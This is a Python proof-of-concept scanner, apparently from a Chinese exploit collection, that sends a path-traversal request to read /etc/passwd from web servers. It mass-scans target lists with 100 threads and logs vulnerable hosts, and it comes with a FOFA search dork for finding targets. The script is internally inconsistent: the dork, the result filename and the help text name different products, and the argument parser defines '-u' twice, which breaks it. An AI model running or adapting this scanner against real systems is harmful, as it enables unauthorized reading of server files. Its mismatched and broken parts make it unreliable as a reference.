# FOFA：body="'/needUsbkey.php?username='"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
                ██╗    ██╗   ██╗███╗   ███╗███████╗███╗   ██╗ ██████╗ 
                ██║    ██║   ██║████╗ ████║██╔════╝████╗  ██║██╔════╝ 
                ██║    ██║   ██║██╔████╔██║█████╗  ██╔██╗ ██║██║  ███╗
                ██║    ╚██╗ ██╔╝██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║   ██║
                ███████╗╚████╔╝ ██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝
                ╚══════╝ ╚═══╝  ╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ 
                                                                    author:秋妤
                                                                    date:2024.09.25
                                                                    version:1.0
    """
    print(test)


def poc(target):
    payload = '/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd'
    headers = {
        'User-Agent':'Mozilla/4.0(compatible;MSIE8.0;Windows NT 6.1)'
    }
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }

    try:
        res1 = requests.get(url = target+payload,headers = headers,verify = False,timeout = 5)
        if res1.status_code == 200 and ':0:0:' in res1.text:
            print(f"[+]{target} 存在漏洞！")
            with open('绿盟_result.txt', 'a', encoding='utf-8') as fp:
                fp.write(f'[+]{target} \n')
        else:
            print(f'[-]{target}不存在漏洞')
    except Exception as e:
        print(e)

def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description='这是一个 金和OA 未授权漏洞 的扫描脚本')
    parser.add_argument('-u','--url',dest='url',help='Please enter url')
    parser.add_argument('-u', '--file', dest='file', help='Please enter file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()